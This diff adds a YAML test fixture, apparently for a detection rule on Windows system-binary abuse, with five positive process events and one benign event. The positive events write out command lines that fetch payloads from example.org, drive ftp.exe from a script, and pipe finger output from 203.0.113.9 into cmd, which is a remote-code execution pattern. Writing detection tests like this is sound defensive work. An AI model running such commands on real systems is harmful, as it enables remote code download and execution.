@@ -1,0 +1,72 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: presentationhost.exe
+      executable: 'C:\Windows\System32\presentationhost.exe'
+      command_line: 'ConfigSecurityPolicy.exe https://example.org/payload.exe'
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: desktopimgdownldr.exe
+      executable: 'C:\Windows\System32\desktopimgdownldr.exe'
+      command_line: 'desktopimgdownldr.exe /lockscreenurl:https://example.org/p.exe /eventName:desktopimgdownldr'
+- id: pos3
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: cmdl32.exe
+      executable: 'C:\Windows\System32\cmdl32.exe'
+      command_line: 'cmdl32 /vpn /lan %cd%\config'
+- id: pos4
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: ftp.exe
+      executable: 'C:\Windows\System32\ftp.exe'
+      command_line: 'ftp.exe -s:C:\Users\Public\cmds.txt'
+- id: pos5
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: finger.exe
+      executable: 'C:\Windows\System32\finger.exe'
+      command_line: 'finger.exe user@203.0.113.9 | cmd'
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: presentationhost.exe
+      executable: 'C:\Windows\System32\presentationhost.exe'
+      command_line: 'presentationhost.exe C:\App\app.xbap'
